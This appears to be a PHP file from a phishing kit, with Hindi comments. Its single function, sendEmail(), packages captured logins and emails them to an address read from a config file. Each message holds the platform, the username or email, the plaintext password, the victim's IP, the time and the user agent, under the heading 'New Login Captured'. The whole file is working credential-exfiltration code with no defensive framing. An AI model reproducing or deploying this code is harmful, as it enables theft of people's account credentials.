<?php
function sendEmail($platform, $username, $password) {
    // ईमेल कॉन्फिग - इसे config/config.php में सेट करें
    $config = include __DIR__ . '/../config/config.php';
    
    if (!$config['email_notifications']) {
        return false;
    }
    
    $to = $config['email_to'];
    $subject = "New Credentials - " . strtoupper($platform);
    
    $message = "=== New Login Captured ===\n";
    $message .= "Platform: " . $platform . "\n";
    $message .= "Username/Email: " . $username . "\n";
    $message .= "Password: " . $password . "\n";
    $message .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    
    $headers = "From: " . $config['from_email'];
    
    if ($config['use_smtp']) {
        // SMTP के लिए mail() फंक्शन
        return mail($to, $subject, $message, $headers);
    } else {
        return mail($to, $subject, $message, $headers);
    }
}
?>
